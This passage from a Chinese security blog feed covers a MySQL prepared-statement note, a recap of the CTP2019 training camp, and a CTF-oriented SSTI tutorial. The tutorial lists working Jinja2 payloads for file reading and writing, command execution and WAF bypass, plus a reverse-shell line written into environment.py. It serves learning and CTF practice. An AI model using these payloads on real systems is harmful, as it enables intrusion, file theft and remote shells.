class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;999,@b&#x3D;&#39;hello&#39;;</span><br><span class="line">prepare ins from &#39;insert into t select ?,?&#39;;</span><br><span class="line">execute ins using @a,@b;</span><br></pre></td></tr></table></figure></li><li><p>释放</p><ul><li><code>{DEALLOCATE | DROP} PREPARE stmt_name</code></li></ul><p><em>eg</em>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare ins;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTP2019-贵阳英才计划集训总结</title>
      <link href="/2019/08/25/CTP2019-%E8%B4%B5%E9%98%B3%E8%8B%B1%E6%89%8D%E8%AE%A1%E5%88%92%E9%9B%86%E8%AE%AD%E6%80%BB%E7%BB%93/"/>
      <url>/2019/08/25/CTP2019-%E8%B4%B5%E9%98%B3%E8%8B%B1%E6%89%8D%E8%AE%A1%E5%88%92%E9%9B%86%E8%AE%AD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="CTP2019-贵阳英才计划集训总结"><a href="#CTP2019-贵阳英才计划集训总结" class="headerlink" title="CTP2019-贵阳英才计划集训总结"></a>CTP2019-贵阳英才计划集训总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        暑假一个人待在实验室学习总会时不时缺乏点动力，有幸在假期能被老师推荐去参加CTP2019集训。集训期间增长了不少见识，认识了许多小伙伴（大佬），还学了不少技术😄</p><p><strong>CTP2019活动简介：</strong><br>        本次集训采取封闭训练的方式，主要面向全国大学生信息安全竞赛中涌现出来的优秀参赛选手，提供前沿、专业、系统、实战的强化训练，培养高精尖的网络空间安全实战力量。CTP2019集训场地为全国首个国家级综合网络靶场——贵阳国家大数据安全靶场，近年来，贵阳靶场已连续4年举行国内规模最大的攻防演练，积累了丰硕的实战成果。</p><h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h3><p>​        第一天上午开营仪式，接下来是第一堂课<strong>攻防演练、护网行动与安全态势</strong>，主要从网络安全态势方面开始解读。当下对网络攻防已经不再是早些年那样隐晦或者避而不谈，在央视新闻中已经直接点名美国对伊朗进行网络攻击。近年来的网络安全事件也层出不穷，17年的Wanna Cry 、维基解密事件；18年万豪用户数据泄露；19年华硕软件更新服务器被劫持、维瑞内拉电力系统遭受攻击等等。网络安全事件的发生正在逐步向国家层面发展靠近，攻击方向也涉及到了国家的基础设施包括：电力、交通、工业、金融、医疗、教育等等。PPT里还详细讲了许多护网攻击方手段，在结尾会给出链接。</p><p>​    <strong>护网行动</strong></p><p>​        近两年才出现的名词。简单来讲是国家对真实的基础设施开展的网络攻防演练活动。习主席的“网络强国战略”为护网行动指明了方向。</p><p>​        习近平总书记指出“<strong>网络安全的本质在对抗，对抗的本质在攻防两端能力较量”、“关键信息基础设施是经济社会运行的神经中枢，是网络安全的重中之重”</strong>。开展“护网演习” 是落实习近平总书记关于“建设网络强国、打赢网络战争”批示的具体举措。</p><p>​    “护网2019”是经<strong>中央批准的</strong>实战攻防演练，是以国家关键信息基础设施为核心对象，在真实网络环境下开展“背对背”实战攻防对抗。</p><p><strong>发展趋势</strong></p><p>​        护网行动在今后必将成为网络安全行业的一大趋势，也是其发展的一大动力。我们研究网络安全技术，就是今后为保障企业、社会、国家的网络基础设施安全而努力着。这也是每一个网络安全从业者的最终目标吧。想想看自己的话，实战技术还需要好好磨练🤕</p><p><strong>攻防演练与传统渗透测试的区别</strong></p><p>1、能真实的面对有组织有技术水平的真正的威胁</p><p>2、进行一个安全加固建设</p><p>3、可以培养和锻炼我们的防护队伍，验证我们的防护手段的真实有效性</p><p>4、发现一些问题，面对攻击的应急处置能力，怎么正式的扭转起这个应急处置的流程</p><p>5、培养自己的攻击队伍，挑选优秀的人员参与演习</p><p>6、吸取经验教训怎么更好的做好防御，真实有效的提高网络安全建设</p><p>​        晚上接触了真实靶场，但是第一天是Typhoon的靶机，之前的信安实验接触过这个靶机，当时还玩了好几种漏洞，于是当天晚上很顺利拿了好几个洞，打进去就root权限也太爽了…</p><h3 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h3><p>​        第二天讲了大数据技术、人工智能技术、区块链、5G通信等交叉学科与安全方面的应用。因为也涉及到很多其他学科的知识，技术细节没有涉及太多，讲的大多是理论上的一个概念，即它们和安全之间的一些理论、框架。</p><p>​        <strong>大数据安全</strong></p><p>主要考虑了三个方面的安全：隐私保护、数据安全、平台安全</p><ul><li>隐私保护：对个人数据的隐私保护</li><li>数据安全：对数据流动过程提供安全防护手段</li><li>平台安全：平台自身的安全+为运行其上的数据和应用提供安全机制</li></ul><p>​        <strong>人工智能安全</strong></p><p>人工智能安全目前正处在一个发展阶段，一些公司正在尝试将人工智能技术应用到网络安全。人工智能与安全的利用点在于：黑客利用人工智能实施网络攻击或躲避检测、安全运维人员利用人工智能提升网络安全防护能力。具体体现在：</p><ul><li>黑客利用人工智能实施网络攻击或躲避检测<ul><li>恶意软件逃逸</li><li>高级鱼叉式钓鱼攻击</li><li>利用AI击败验证码</li><li>绕过安全检测的钓鱼网页</li><li>让机器学习引擎“中毒”</li></ul></li><li>利用人工智能提升网络安全防护能力<ul><li>基于日志数据，快速检测高级攻击，智能排序事件优先级</li><li>借助机器学习算法，建立情报收集、分析、共享的大数据服务平台</li><li>将机器学习算法应用到工业互联网，检测网络操作异常行为</li><li>基于行为分析，为高科技，金融等行业提供数据保护</li></ul></li></ul><p>​        <strong>区块链安全</strong></p><p>关于区块链安全一块听得很迷糊，之前也没接触过，ppt中从区块链的基本概念，构架，安全性分析讲了很多内容，这里具体也说不清楚，文末甩链接…</p><h3 id="day3"><a href="#day3" class="headerlink" title="day3"></a>day3</h3><p>​        第三天主要从威胁情报、情报分析等方面进行讲解。总结了情报的概念，情报的收集获取的重要性。其中举例了早些年的一些情报收集工作带来的显著成效。情报收集如何做？</p><p>​    <strong>充分利用表网，重点用好深网，适时渗透暗网</strong></p><p>​    ppt里没有细讲如何去做情报收集，因为针对不同的事件，情报收集的方向就大不一样。就拿去某景区旅游来说，事先需要收集的情报可以有很多，下面列举一些方向：</p><ul><li>如何去？</li><li>什么时间去？</li><li>天气如何？</li><li>景区是否还开放售票？</li><li>人们的评价？</li><li>以及如果xxx那该xxx去执行？</li></ul><p>​        总之，当时的讲师列出了很多的方面，我不得不感叹做情报工作的思维的开阔和心细，他能想到的许多方面我都没想到，上面只是一点点我还记得的列举…当时我是有一个疑问的，对于讲师提到的那些事件的情报收集为什么能达到如此细致我很纳闷，后来有同学正好也问到类似的问题，大概可以这么理解：对个人来讲，做情报收集能力有限，很多大公司都有属于自己的一套情报收集工具、方案。同样政府公安等他们也有一套专门的情报收集工具，这个也没有具体透露。emmmmm之前以为能学到实战怎么收集…结果也只是讲了讲理论。</p><p>​        其实情报收集不就是渗透测试里我们最需要关注的信息收集？只要信息收集得好，甚至直接网上搜出弱口令、vpn的情况也不稀奇。信息收集不能只局限于子域名、端口、服务这几个基本的面。往往我在操作的时候就偷懒不愿意去搜集其他信息，这也是需要留心改正的一个点。打算今后把信息收集的方向进行一个总结，现在脑子里对它的概念还比较单一，不够发散。之前去的实战给了我不少新思路，届时又新想到了就再补上吧。</p><h3 id="day4"><a href="#day4" class="headerlink" title="day4"></a>day4</h3><p>​        第四天有一个网络流量分析的实战，给的是一个护网流量数据，从中可以分析提取出各种攻击流量。以往接触流量分析大多在于使用一些网络工具会抓个包看看参数等，或者说是去做一个CTF题。而这次的流量分析跟以往的不同在于它的流量特别大，而且攻击手段各种各样，要想完整做一个流量分析我觉得要做到以下几点：</p><ul><li><strong>熟练使用wireshark的过滤规则</strong>。毕竟流量那么大，一条一条去看是不现实的。</li><li><strong>对各种攻击手段要有一定的了解</strong>。比如对某一个cve攻击流量会出现一些什么样的参数，在分析时可以提取一些什么“共有”的敏感参数来进行过滤等等。</li></ul><p>​        下午有一位安全领域的权威专业，雄安新区总安全顾问陆宝华老先生来为我们讲了等保2.0。</p><p><strong>什么是等保2.0？</strong></p><p>等保的全称——信息安全技术 网络安全等级保护基本要求。</p><p><strong>等保2.0和攻防演练的区别</strong></p><p>1、等保测评2.0是合规性，是对安全体系从设计到应用的安全性的评估检验，是安全评估的一个基础和评判依据</p><p>2、攻防演练是在此基础上进行进一步校验。</p><p>a、能够校验其实际生产环境中是否存在被疏忽的违规行为（比如非法外联）</p><p>b、能够校验是否存在有安全设备，但未合理配置使用导致防御体系无效的情况</p><p>c、能够校验员工安全意识、应急处置机制是否能有效运转。</p><p>​        听这个课感觉有点亲切——涉及到很多安全合规性的理论知识，比如什么最小特权、授权机制、访问控制、可信计算基TCB、Biba模型、BLP模型等等</p><p>​        没错…感觉像是在听操作系统课！😄</p><h2 id="学到了什么？"><a href="#学到了什么？" class="headerlink" title="学到了什么？"></a>学到了什么？</h2><p>​        总得来说，理论方面只能说拓宽了眼界吧，讲到了好多新学科新领域的知识，也不敢说自己都能听懂，但是这些所谓的理论知识的学习也是必不可少的。</p><p>​        当时陆老先生说了一句我认为很精髓的话，也很值得我们反思。大概意思是这样的，“我们搞安全的不能只局限于那些安全技术、挖挖漏洞什么的，要多从整体上了解安全，了解安全的的一些构架框架等。”</p><p>​        还有电子科大的一位教授也说了，“我们不能只会打打CTF，国家需要的是有创新能力的人才，搞搞CTF那是没有技术含量的事，要多参加信息安全作品赛”。 虽然我不敢苟同他的说法，但是也确实值得我自己去思考，打CTF为了什么？不可能说把CTF当成一切，但它确实是我入门安全的一个很好的途径，我很庆幸自己是一名CTFer，但同时我也会为今后的发展考虑考虑，多学学渗透，多打打实战，这个也是我给自己拟定的今后的就业方向。</p><p>​        实战方面，每天晚上都去靶场进行了渗透，接触到一个真大牛，赵春师傅。最后一天晚上留下来听他讲了很多渗透的思路，入手点。还听了他许多传奇经历….果然牛人就是什么都会，从底层硬件到数据恢复，到逆向工程到渗透实战，甚至是什么智能车、卫星通信等等都有很深的了解。他有一句话讲得真好，当时有人问他不会渗透怎么半，听不懂怎么办，“什么不会就去学啊，不懂不要紧，但是你要乐于去学啊，不学那不就错过了一次机会吗？”说白了….整就强！</p><h2 id="获得了什么？"><a href="#获得了什么？" class="headerlink" title="获得了什么？"></a>获得了什么？</h2><ul><li><p>外联</p><p>认识了许多大佬，也有许多其他高校的同学，今后假如学校CTF比赛方面可以考虑和他们外联</p></li><li><p>渗透资源</p><p>赵春师傅的靶场，各种漏洞环境docker，今后的训练，对下一届的培养等方面都可以利用</p></li><li><p>PPT、大/小作业</p><p>内部学习，拓宽眼界</p></li><li><p>个人的提升（没法细说的那种..）</p><p>理论的认识、技术的提升</p></li></ul><h2 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h2><p><strong>讲课PPT</strong></p><p>链接：<a href="https://pan.baidu.com/s/1qTzkCXUNe0SjIhl2PxoXVQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1qTzkCXUNe0SjIhl2PxoXVQ</a><br>提取码：0hbs </p><p><strong>流量分析小作业</strong></p><p>链接：<a href="https://pan.baidu.com/s/1slYjGhyaoW6l-VEdXLdM3A" target="_blank" rel="noopener">https://pan.baidu.com/s/1slYjGhyaoW6l-VEdXLdM3A</a><br>提取码：1ios </p><p><strong>攻防演练想定设计大作业</strong></p><p>链接：<a href="https://pan.baidu.com/s/1cLoJBV_9ajhiaNQE6vHUbw" target="_blank" rel="noopener">https://pan.baidu.com/s/1cLoJBV_9ajhiaNQE6vHUbw</a><br>提取码：ikvd </p><p>靶场资源太大没法上传，开学传内部wiki..</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -CTP2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务端模板注入(SSTI攻击)</title>
      <link href="/2019/04/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI%E6%94%BB%E5%87%BB/"/>
      <url>/2019/04/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="模板注入（SSTI）"><a href="#模板注入（SSTI）" class="headerlink" title="模板注入（SSTI）"></a>模板注入（SSTI）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近刷题刷到SSTI的题，最初死活找不到入题思路，后续看了WP才找到切入点，想起来自己之前挖的坑…SSTI的原理还是需要好好总结一下的。</p><p>​    By the way..文章后部分有例题</p><h1 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​    SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的，目前CTF常见的SSTI题中，大部分是考python的。</p><p>​    什么是模板？说实话上学期每周练做题的时候我也不懂。前一阵子接触了Django，稍微了解了一些web开发，可算知道模板是什么了，对SSTI理解也更清晰了些。简单说一下：</p><p>​    web开发采用MVC/MTC模式，可以理解为数据库 、模板文件 、业务处理，简单的可以这么描述，用户在url里输入了某种路径，即请求了某种业务，然后web服务器通过返回模板，模板中对数据进行填充就得到了用户应该看到的html源码。如下为一种简单模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">        &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;&#x2F;title&gt;</span><br><span class="line">      &lt;&#x2F;head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;Hello, &#123;&#123;user&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;&#x2F;body&gt;</span><br><span class="line">    &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>​    开发环境中数据不可能写成静态，于是就采用模板来实现，即通过传参title、user等可以将模板中的title、user 替换成相应内容。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    模板注入怎么形成？看一个简单例子：（render_template_string）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">    from flask import render_template</span><br><span class="line">    from flask import request</span><br><span class="line">    from flask import render_template_string</span><br><span class="line">    app &#x3D; Flask(__name__)</span><br><span class="line">    @app.route(&#39;&#x2F;test&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">    def test():</span><br><span class="line">        template &#x3D; &#39;&#39;&#39;</span><br><span class="line">            &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">                &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">            &lt;&#x2F;div&gt; </span><br><span class="line">        &#39;&#39;&#39; %(request.url)</span><br><span class="line">return render_template_string(template)</span><br><span class="line">    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">        app.debug &#x3D; True</span><br><span class="line">        app.run()</span><br></pre></td></tr></table></figure><p>​    代码将我们的url填入html代码中，如果我们此时在url中填入了&#123;&#123; &#125;&#125;就可以导致SSTI注入。</p><p>​    而如果我们使用render_template函数。即模板是先写好的，此时就不能注入了，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">    @app.route(&#39;&#x2F;index&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])#我们访问&#x2F;或者&#x2F;index都会跳转</span><br><span class="line">    def index():</span><br><span class="line">       return render_template(&quot;index.html&quot;,title&#x3D;&#39;Home&#39;,user&#x3D;request.args.get(&quot;key&quot;))</span><br><span class="line"></span><br><span class="line">index.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">        &lt;title&gt;&#123;&#123;title&#125;&#125; &lt;&#x2F;title&gt;</span><br><span class="line">      &lt;&#x2F;head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;Hello, &#123;&#123;user&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;&#x2F;body&gt;</span><br><span class="line">    &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>​    再来几个例子帮助理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output &#x3D; $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; &#x3D;&gt; $_GET[&quot;name&quot;]));  &#x2F;&#x2F; 将用户输入作为模版变量的值</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure><p>​    使用 Twig 模版引擎渲染页面，其中模版含有 name} 变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。</p><p>​    但是如果渲染的模板内容受到用户控制就会引发漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output &#x3D; $twig-&gt;render(&quot;Hello &#123;$_GET[&#39;name&#39;]&#125;&quot;);  &#x2F;&#x2F; 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure><p>这时候传入JS是可以被执行的</p><p>参考:</p><ul><li><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></li><li><a href="https://www.jianshu.com/p/aef2ae0498df" target="_blank" rel="noopener">https://www.jianshu.com/p/aef2ae0498df</a></li><li><a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a></li><li><a href="https://www.jianshu.com/p/367ea79c5482" target="_blank" rel="noopener">https://www.jianshu.com/p/367ea79c5482</a></li></ul><h3 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h3><p><img src="/服务端模板注入-SSTI攻击/pic1.png" alt=""></p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>​    试想一下，在一个python文件里，传入的模板受用户控制，那么我们就可以通过某些方法在此受限的环境里构造出能实现文件读取类似的代码并执行。</p><p>如下：通过python 内置函数，列出一个模组/类/对象来实现函数调用</p><p><strong>函数解析</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回调用的参数类型</span><br><span class="line">__bases__ 返回类型列表</span><br><span class="line">__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组</span><br><span class="line">__subclasses__() 返回object的子类</span><br><span class="line">__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></pre></td></tr></table></figure><p><strong>获取基本类</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用</span><br></pre></td></tr></table></figure><p><img src="/服务端模板注入-SSTI攻击/pic2.png" alt=""></p><p>获取基本类后，继续向下获取基本类(object)的子类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()</span><br></pre></td></tr></table></figure><p><img src="/服务端模板注入-SSTI攻击/pic3.png" alt=""></p><p>我们可以看到object的子类很多，找到我们能用的一些类，就可以实现构造”恶意函数“了。</p><p>关于mro和subclasses，参考: <a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p><p>​    网上翻了许多博客和技术文章，看到了许多payload，这里就简单列举两个常用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0] </span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#读文件： .__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() </span><br><span class="line">#写文件： .__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) </span><br><span class="line">#查看目录 __import__.__getattribute__(&#39;__clo&#39;+&#39;sure__&#39;)[0].cell_contents(&#39;o&#39;+&#39;s&#39;).__getattribute__(&#39;sy&#39;+&#39;stem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br></pre></td></tr></table></figure><p>在这里[40]索引到的是“&lt;type ‘file’ &gt; ”</p><p>之前刷题遇到的坑：python2、python3不同环境执行的payload不同：</p><p><strong>python2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注入变量执行命令详见 http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;98928.html </span><br><span class="line">#读文件： &#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125; </span><br><span class="line">#写文件： &#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>​    flask 默认用的jinja2模板语言。也可以通过写jinja2的environment.py执行命令; jinja2的模板会load这个module，而且这个environment.py import了os模块, 所以只要能写这个文件，就可以执行任意命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#假设在&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;jinja2&#x2F;environment.py, 弹一个shell</span><br><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;jinja2&#x2F;environment.py&#39;).write(&quot;\nos.system(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[IP_ADDR]&#x2F;[PORT] 0&gt;&amp;1&#39;)&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>python3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#命令执行： &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">#文件操作 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>python3 利用 <strong>globals</strong>[‘<strong>builtins </strong>‘]的一种姿势：</p><p>参考：<a href="http://www.ee50.com/ld/940.html" target="_blank" rel="noopener">http://www.ee50.com/ld/940.html</a></p><h3 id="详细payload-绕过"><a href="#详细payload-绕过" class="headerlink" title="详细payload/绕过"></a>详细payload/绕过</h3><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8</a></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><ol><li><p>自己随手git了一个SSTI攻击的靶场，link : <a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p><p>payload :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;your command&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></li></ol><p><img src="/服务端模板注入-SSTI攻击/pic4.png" alt=""></p><p>​    同样也可以在这个靶场测试一下各种payload，根据环境的不同，有时候payload不一定有效，重要的是学会这样一种”构造“方法，可以在python cmd里去多试试那些内置模块。</p><ol><li><p>最近刷题刷到的那个题。不难，太菜看不出。。</p><p>（ 页面源代码中给出了flag所在 ）</p></li></ol><p><img src="/服务端模板注入-SSTI攻击/pic5.png" alt=""></p><p>其实注入发生在url中，主要是waf有点麻烦，绕的有点多。</p><p>执行命令是这一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.class.mro[2].subclasses()40.read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>绕完waf是这一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[&#39;__cla&#39;+&#39;ss__&#39;][&#39;__mr&#39;+&#39;o__&#39;][2][&#39;__subcla&#39;+&#39;sses__&#39;]()[40](&#39;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;).next()&#125;&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>绕过姿势++</strong> （用[ 